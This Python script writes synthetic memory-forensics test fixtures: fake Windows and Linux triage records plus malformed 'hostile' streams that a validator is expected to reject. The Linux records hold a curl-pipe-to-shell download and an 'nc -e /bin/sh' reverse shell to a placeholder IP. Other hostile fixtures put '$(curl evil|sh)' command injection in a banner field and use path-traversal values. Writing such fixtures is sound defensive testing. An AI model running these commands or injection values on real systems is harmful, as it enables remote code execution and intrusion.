# ruff: noqa: E501 - hand-written fixture records, one per line
"""Writes the `memory.v1` fixtures of this directory (M8 phase 1, frozen with the contract).

Every record below is hand-written, synthetic and labelled as such in its header
(`engine: replay`, `tool_versions.fixture`): none of it comes from a real memory image or a
real analysis (requirement.txt §16). This script only serializes the records and computes the
trailers (line count + sha256 of every byte before the trailer line), so a fixture change is
reviewed here, never in the generated NDJSON.

    python packages/py-jobs/tests/fixtures/memory/build_fixtures.py   (pure Python, no deps)
"""

import hashlib
import json
from pathlib import Path
from typing import Any

HERE = Path(__file__).resolve().parent
HOSTILE = HERE / "hostile"

WINDOWS_JOB = "6a1f0c1e-8d6b-4c55-9d9e-0d1b6f5a1001"
LINUX_JOB = "6a1f0c1e-8d6b-4c55-9d9e-0d1b6f5a1002"
DIAG_JOB = "6a1f0c1e-8d6b-4c55-9d9e-0d1b6f5a1003"
LABEL = "synthetic hand-written fixture (not a real image, not real analysis)"
T0 = "2026-11-01T08:00:00Z"
# The fixture "images" are 64 MiB of nothing: only their claimed size and hash appear here.
IMAGE_SHA = "b" * 64
IMAGE_SIZE = 67_108_864

Line = dict[str, Any]


def _ts(minute: int, second: int = 0) -> str:
    return f"2026-11-01T{8 + minute // 60:02d}:{minute % 60:02d}:{second:02d}Z"


def _header(job: str, os: str, profile: str, plugins: list[str], **extra: Any) -> Line:
    header: Line = {
        "kind": "header",
        "schema_version": "memory.v1",
        "job_id": job,
        "profile": profile,
        "os": os,
        "engine": "replay",
        "tool_versions": {"fixture": LABEL, "volatility3": "2.28.2"},
        "symbols": {"status": "resolved", "isf_sha256": "c" * 64},
        "plugins": [
            {"plugin": p, "status": "ok", "rows": 1, "truncated": False, "duration_ms": 1000}
            for p in plugins
        ],
        "audit_events": {},
        "engine_errors": [],
        "truncated": {},
    }
    header.update(extra)
    return header


WINDOWS_PLUGINS = [
    "windows.info",
    "windows.pslist",
    "windows.psscan",
    "windows.cmdline",
    "windows.dlllist",
    "windows.netscan",
    "windows.malware.malfind",
    "windows.svcscan",
    "windows.registry.hivelist",
    "windows.registry.userassist",
]
LINUX_PLUGINS = ["linux.pslist", "linux.psaux", "linux.bash", "linux.sockstat"]

# (pid, ppid, name, image path) of a small Windows 10 workstation; offsets are made up.
_WIN_PROCS = [
    (4, 0, "System", None),
    (92, 4, "Registry", None),
    (356, 4, "smss.exe", r"\SystemRoot\System32\smss.exe"),
    (468, 460, "csrss.exe", r"C:\Windows\system32\csrss.exe"),
    (544, 460, "wininit.exe", r"C:\Windows\system32\wininit.exe"),
    (552, 536, "csrss.exe", r"C:\Windows\system32\csrss.exe"),
    (640, 536, "winlogon.exe", r"C:\Windows\system32\winlogon.exe"),
    (676, 544, "services.exe", r"C:\Windows\system32\services.exe"),
    (696, 544, "lsass.exe", r"C:\Windows\system32\lsass.exe"),
    (804, 676, "svchost.exe", r"C:\Windows\system32\svchost.exe"),
    (828, 544, "fontdrvhost.exe", r"C:\Windows\system32\fontdrvhost.exe"),
    (900, 676, "svchost.exe", r"C:\Windows\system32\svchost.exe"),
    (980, 640, "dwm.exe", r"C:\Windows\system32\dwm.exe"),
    (1040, 676, "svchost.exe", r"C:\Windows\System32\svchost.exe"),
    (1104, 676, "svchost.exe", r"C:\Windows\System32\svchost.exe"),
    (1220, 676, "svchost.exe", r"C:\Windows\system32\svchost.exe"),
    (1388, 676, "spoolsv.exe", r"C:\Windows\System32\spoolsv.exe"),
    (1460, 676, "svchost.exe", r"C:\Windows\system32\svchost.exe"),
    (1652, 676, "MsMpEng.exe", r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe"),
    (1700, 676, "svchost.exe", r"C:\Windows\system32\svchost.exe"),
    (1812, 676, "VGAuthService.exe", r"C:\Program Files\VMware\VMware Tools\VGAuthService.exe"),
    (1876, 676, "vmtoolsd.exe", r"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"),
    (2024, 676, "svchost.exe", r"C:\Windows\system32\svchost.exe"),
    (2280, 804, "WmiPrvSE.exe", r"C:\Windows\system32\wbem\wmiprvse.exe"),
    (2512, 676, "SearchIndexer.exe", r"C:\Windows\system32\SearchIndexer.exe"),
    (3004, 640, "userinit.exe", r"C:\Windows\system32\userinit.exe"),
    (3040, 3004, "explorer.exe", r"C:\Windows\Explorer.EXE"),
    (3320, 804, "RuntimeBroker.exe", r"C:\Windows\System32\RuntimeBroker.exe"),
    (3416, 804, "SearchUI.exe", r"C:\Windows\SystemApps\SearchUI.exe"),
    (3608, 3040, "SecurityHealthSystray.exe", r"C:\Windows\System32\SecurityHealthSystray.exe"),
    (3672, 676, "SecurityHealthService.exe", r"C:\Windows\system32\SecurityHealthService.exe"),
    (3740, 3040, "vmtoolsd.exe", r"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"),
    (4012, 3040, "OneDrive.exe", r"C:\Users\alice\AppData\Local\Microsoft\OneDrive\OneDrive.exe"),
    (4388, 3040, "msedge.exe", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"),
    (4420, 4388, "msedge.exe", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"),
    (4876, 3040, "WINWORD.EXE", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"),
    (5120, 3040, "cmd.exe", r"C:\Windows\system32\cmd.exe"),
    (5144, 5120, "conhost.exe", r"C:\Windows\system32\conhost.exe"),
    (5260, 5120, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
]
_CMDLINES = {
    5260: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
    5120: r'"C:\Windows\system32\cmd.exe" /c net use \\fileserver\share /user:alice S3cretPass!',
    4876: r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\alice\Documents\invoice.docm"',
}


def windows_records() -> list[Line]:
    lines: list[Line] = [
        {
            "kind": "image",
            "size_bytes": IMAGE_SIZE,
            "sha256": IMAGE_SHA,
            "layer": "WindowsCrashDump64Layer>WindowsIntel32e",
            "arch": "x64",
            "nt_build": "19041",
            "pdb": {"name": "ntkrnlmp.pdb", "guid": "0123456789ABCDEF0123456789ABCDEF", "age": 1},
            "system_time": _ts(90),
        }
    ]
    for i, (pid, ppid, name, path) in enumerate(_WIN_PROCS):
        lines.append(
            {
                "kind": "process",
                "pid": pid,
                "ppid": ppid,
                "name": name,
                "offset": 0xFFFF_A08F_0000_0000 + i * 0x1000,
                "create_time": _ts(i // 4, i % 60),
                "exit_time": None,
                "threads": 4 + i % 30,
                "handles": 100 + i * 7,
                "session_id": 0 if pid < 3000 else 1,
                "wow64": False,
                "sources": ["pslist", "psscan"],
                "cmdline": _CMDLINES.get(pid, path),
                "image_path": path,
            }
        )
    # Found by psscan only, still running: the "hidden process" shape (phase 3 detector).
    lines.append(
        {
            "kind": "process",
            "pid": 6112,
            "ppid": 3040,
            "name": "svch0st.exe",
            "offset": 0x0000_0000_1E3A_0080,
            "create_time": _ts(60),
            "threads": 3,
            "sources": ["psscan"],
            "cmdline": r"C:\Users\Public\svch0st.exe",
            "image_path": r"C:\Users\Public\svch0st.exe",
        }
    )
    lines += [
        {
            "kind": "connection",
            "proto": "tcp",
            "local_addr": "10.0.0.15",
            "local_port": 49712,
            "remote_addr": "203.0.113.50",
            "remote_port": 443,
            "state": "ESTABLISHED",
            "pid": 6112,
            "owner": "svch0st.exe",
            "created": _ts(61),
            "offset": 0xFFFF_A08F_1234_0000,
        },
        {
            "kind": "connection",
            "proto": "tcp",
            "local_addr": "0.0.0.0",
            "local_port": 445,
            "state": "LISTENING",
            "pid": 4,
            "owner": "System",
            "offset": 0xFFFF_A08F_1234_1000,
        },
        {
            "kind": "connection",
            "proto": "udp",
            "local_addr": "::",
            "local_port": 5353,
            "pid": 4388,
            "owner": "msedge.exe",
            "offset": 0xFFFF_A08F_1234_2000,
        },
        {
            "kind": "injection",
            "pid": 6112,
            "process": "svch0st.exe",
            "start": 0x0000_0000_0040_0000,
            "end": 0x0000_0000_0040_FFFF,
            "protection": "PAGE_EXECUTE_READWRITE",
            "tag": "VadS",
            "private": True,
            "commit_charge": 16,
            "has_pe": True,
            "head_hex": "4d5a90000300000004000000ffff0000b800000000000000400000000000000000",
            "disasm": "0x400000: dec ebp\n0x400001: pop edx",
        },
        {"kind": "artifact", "type": "module", "pid": 4388, "attributes": {"path": r"C:\Windows\System32\ntdll.dll", "base": 140715161255936, "size": 2031616}},
        {"kind": "artifact", "type": "service", "pid": 1388, "attributes": {"name": "Spooler", "state": "SERVICE_RUNNING", "start": "SERVICE_AUTO_START", "binary": r"C:\Windows\System32\spoolsv.exe"}},
        {"kind": "artifact", "type": "service", "pid": None, "attributes": {"name": "UpdaterSvc", "state": "SERVICE_RUNNING", "start": "SERVICE_AUTO_START", "binary": r"C:\ProgramData\Updater\upd.exe"}},
        {"kind": "artifact", "type": "hive", "attributes": {"path": r"\REGISTRY\MACHINE\SYSTEM", "offset": 272678883688448}},
        {"kind": "artifact", "type": "userassist", "attributes": {"hive": r"\??\C:\Users\alice\ntuser.dat", "path": r"C:\Users\Public\svch0st.exe", "count": 3, "last_updated": "2026-11-01T08:59:00Z"}},
        {"kind": "artifact", "type": "ldr_unlinked", "pid": 6112, "attributes": {"base": 4194304, "in_load": False, "in_init": False, "in_mem": False, "path": r"C:\Users\Public\x.dll"}},
        {
            "kind": "finding",
            "finding_id": "8b7c2f1a-5f0e-4a7e-9a11-000000000001",
            "ts": _ts(90),
            "type": "mem_hidden_process",
            "title": "Process found by pool scan but not in the active process list",
            "description": "pid 6112 (svch0st.exe) appears in psscan only, has 3 threads and no exit time.",
            "severity": "medium",
            "confidence": 0.7,
            "detection_method": "heuristic:mem_hidden_process@1",
            "evidence_refs": ["pid:6112"],
            "attributes": {"pid": 6112},
        },
        {
            "kind": "finding",
            "finding_id": "8b7c2f1a-5f0e-4a7e-9a11-000000000002",
            "ts": _ts(90),
            "type": "mem_suspicious_cmdline",
            "title": "PowerShell started with an encoded command and a hidden window",
            "description": "pid 5260: powershell.exe -nop -w hidden -enc SQ********(52)",
            "severity": "medium",
            "confidence": 0.6,
            "detection_method": "heuristic:mem_suspicious_cmdline@1",
            "evidence_refs": ["pid:5260"],
            "attributes": {"pid": 5260},
        },
        {"kind": "ioc", "type": "ip", "value": "203.0.113.50", "first_seen": _ts(61), "last_seen": _ts(61), "count": 1, "source": "connection"},
        {"kind": "ioc", "type": "file_path", "value": r"C:\Users\Public\svch0st.exe", "first_seen": _ts(60), "last_seen": _ts(60), "count": 1, "source": "cmdline"},
        {"kind": "timeline", "ts": _ts(90), "event": "system_time", "title": "Image system time"},
        {"kind": "timeline", "ts": _ts(60), "event": "process_start", "title": "svch0st.exe started", "pid": 6112, "ref": "6112"},
        {"kind": "timeline", "ts": _ts(61), "event": "connection", "title": "Connection to 203.0.113.50:443", "pid": 6112, "remote_ip": "203.0.113.50"},
        {"kind": "timeline", "ts": _ts(90), "event": "finding", "title": "Process found by pool scan but not in the active process list", "severity": "medium", "ref": "8b7c2f1a-5f0e-4a7e-9a11-000000000001"},
    ]
    return lines


def linux_records() -> list[Line]:
    banner = "Linux version 6.1.0-26-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14) 12.2.0) #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30)"
    procs = [
        (1, 0, "systemd", "/sbin/init"),
        (2, 0, "kthreadd", None),
        (412, 1, "systemd-journal", "/lib/systemd/systemd-journald"),
        (640, 1, "sshd", "/usr/sbin/sshd -D"),
        (701, 1, "cron", "/usr/sbin/cron -f"),
        (1022, 640, "sshd", "sshd: deploy [priv]"),
        (1030, 1022, "bash", "-bash"),
        (1101, 1030, "sh", "sh -c curl -s http://198.51.100.7/x.sh | sh"),
        (1102, 1101, "nc", "nc -e /bin/sh 198.51.100.7 4444"),
    ]
    lines: list[Line] = [
        {
            "kind": "image",
            "size_bytes": IMAGE_SIZE,
            "sha256": IMAGE_SHA,
            "layer": "LimeLayer>Intel32e",
            "arch": "x64",
            "kernel_banner": banner,
            "system_time": _ts(30),
        }
    ]
    for i, (pid, ppid, name, cmd) in enumerate(procs):
        lines.append(
            {
                "kind": "process",
                "pid": pid,
                "ppid": ppid,
                "name": name,
                "offset": 0xFFFF_9A00_0100_0000 + i * 0x2000,
                "create_time": _ts(i),
                "threads": 1,
                "sources": ["pslist"],
                "cmdline": cmd,
            }
        )
    lines += [
        {"kind": "connection", "proto": "tcp", "local_addr": "10.0.0.20", "local_port": 22, "state": "LISTEN", "pid": 640, "owner": "sshd"},
        {"kind": "connection", "proto": "tcp", "local_addr": "10.0.0.20", "local_port": 51234, "remote_addr": "198.51.100.7", "remote_port": 4444, "state": "ESTABLISHED", "pid": 1102, "owner": "nc"},
        {"kind": "connection", "proto": "unix", "pid": 412, "owner": "systemd-journal"},
        {"kind": "artifact", "type": "bash", "pid": 1030, "attributes": {"command": "curl -s http://198.51.100.7/x.sh | sh", "time": "2026-11-01T08:07:00Z"}},
        {"kind": "artifact", "type": "bash", "pid": 1030, "attributes": {"command": "mysql -u root -pHunter2pass appdb", "time": "2026-11-01T08:06:00Z"}},
        {
            "kind": "finding",
            "finding_id": "8b7c2f1a-5f0e-4a7e-9a11-000000000011",
            "ts": _ts(30),
            "type": "mem_linux_shell_history",
            "title": "Shell history pipes a download into a shell",
            "description": "bash pid 1030: curl -s http://198.51.100.7/x.sh | sh",
            "severity": "medium",
            "confidence": 0.7,
            "detection_method": "heuristic:mem_linux_shell_history@1",
            "evidence_refs": ["pid:1030"],
        },
        {"kind": "ioc", "type": "url", "value": "http://198.51.100.7/x.sh", "first_seen": _ts(7), "last_seen": _ts(7), "count": 1, "source": "bash"},
        {"kind": "ioc", "type": "ip", "value": "198.51.100.7", "first_seen": _ts(8), "last_seen": _ts(8), "count": 2, "source": "connection"},
        {"kind": "timeline", "ts": _ts(30), "event": "system_time", "title": "Image system time"},
        {"kind": "timeline", "ts": _ts(8), "event": "process_start", "title": "nc started", "pid": 1102},
    ]
    return lines


def _encode(line: Line) -> bytes:
    return json.dumps(line, ensure_ascii=False, separators=(",", ":")).encode() + b"\n"


def write_stream(path: Path, lines: list[Line], *, trailer: bool = True, after: Line | None = None) -> None:
    body = b"".join(_encode(line) for line in lines)
    out = body
    if trailer:
        digest = hashlib.sha256(body).hexdigest()
        out += _encode({"kind": "trailer", "line_count": len(lines), "sha256": digest})
    if after is not None:
        out += _encode(after)
    path.write_bytes(out)


def _patched(lines: list[Line], index: int, **fields: Any) -> list[Line]:
    copy = [dict(line) for line in lines]
    copy[index].update(fields)
    return copy


def main() -> None:
    HOSTILE.mkdir(exist_ok=True)
    win = [_header(WINDOWS_JOB, "windows", "triage", WINDOWS_PLUGINS), *windows_records()]
    write_stream(HERE / "windows_triage.ndjson", win)
    lin = [_header(LINUX_JOB, "linux", "triage", LINUX_PLUGINS), *linux_records()]
    write_stream(HERE / "linux_triage.ndjson", lin)
    diag = [
        _header(
            DIAG_JOB,
            "windows",
            "triage",
            [],
            symbols={
                "status": "missing",
                "required": {"name": "ntkrnlmp.pdb", "guid": "89ABCDEF0123456789ABCDEF01234567", "age": 2},
            },
        ),
        windows_records()[0],
    ]
    write_stream(HERE / "symbols_missing.ndjson", diag)

    # Hostile streams: each must be refused by the contract or the framing rules.
    proc = next(i for i, line in enumerate(win) if line["kind"] == "process")
    art = next(i for i, line in enumerate(win) if line["kind"] == "artifact")
    find = next(i for i, line in enumerate(win) if line["kind"] == "finding")
    write_stream(HOSTILE / "wrong_job.ndjson", _patched(win, 0, job_id=LINUX_JOB))
    nan = b"".join(_encode(line) for line in win).replace(b'"confidence":0.7', b'"confidence":NaN', 1)
    digest = hashlib.sha256(nan).hexdigest()
    (HOSTILE / "nan.ndjson").write_bytes(nan + _encode({"kind": "trailer", "line_count": len(win), "sha256": digest}))
    write_stream(HOSTILE / "nul_char.ndjson", _patched(win, proc, name="svc\u0000host.exe"))
    write_stream(HOSTILE / "oversize_cmdline.ndjson", _patched(win, proc, cmdline="A" * 4097))
    write_stream(HOSTILE / "attributes_33.ndjson", _patched(win, art, attributes={f"k{i}": i for i in range(33)}))
    write_stream(HOSTILE / "nested_attribute.ndjson", _patched(win, art, attributes={"path": {"nested": "x"}}))
    write_stream(HOSTILE / "float_attribute.ndjson", _patched(win, art, attributes={"ratio": 0.5}))
    write_stream(HOSTILE / "extra_field.ndjson", _patched(win, proc, verdict="malicious"))
    write_stream(HOSTILE / "unknown_plugin.ndjson", _patched(win, 0, plugins=[{"plugin": "windows.handles", "status": "ok"}]))
    write_stream(HOSTILE / "address_overflow.ndjson", _patched(win, proc, offset=2**64))
    write_stream(HOSTILE / "verdict_severity.ndjson", _patched(win, find, severity="critical"))
    bad_guid = [dict(line) for line in diag]
    bad_guid[0] = {**bad_guid[0], "symbols": {"status": "missing", "required": {"name": "ntkrnlmp.pdb", "guid": "../../etc/passwd0000000000000000", "age": 1}}}
    write_stream(HOSTILE / "bad_guid.ndjson", bad_guid)
    bad_pdb = [dict(line) for line in diag]
    bad_pdb[0] = {**bad_pdb[0], "symbols": {"status": "missing", "required": {"name": "evil.pdb", "guid": "0" * 32, "age": 1}}}
    write_stream(HOSTILE / "non_kernel_pdb.ndjson", bad_pdb)
    banner = [dict(line) for line in lin]
    banner[0] = {**banner[0], "plugins": [], "symbols": {"status": "missing", "required": {"banner": "Linux version 6.1\n$(curl evil|sh)"}}}
    write_stream(HOSTILE / "banner_control_chars.ndjson", banner[:2])
    write_stream(HOSTILE / "after_trailer.ndjson", win, after=win[proc])
    write_stream(HOSTILE / "no_trailer.ndjson", win, trailer=False)
    write_stream(HOSTILE / "diagnostic_with_records.ndjson", [*diag, win[proc]])
    manifest = {
        "version": 1,
        "volatility_version": "2.28.2",
        "files": [
            {
                "path": "windows/ntkrnlmp.pdb/../../../etc/cron.d/x.json.xz",
                "sha256": "d" * 64,
                "os": "windows",
                "identity": {"name": "ntkrnlmp.pdb", "guid": "0" * 32, "age": 1},
                "source": "operator",
                "imported_at": T0,
                "tool_version": "memory-symbols/0.1.0",
            }
        ],
    }
    (HOSTILE / "manifest_dotdot.json").write_bytes((json.dumps(manifest, indent=2) + "\n").encode())
    good = {**manifest, "files": [{**manifest["files"][0], "path": "windows/ntkrnlmp.pdb/00000000000000000000000000000000-1.json.xz"}]}
    (HERE / "manifest.json").write_bytes((json.dumps(good, indent=2) + "\n").encode())


if __name__ == "__main__":
    main()
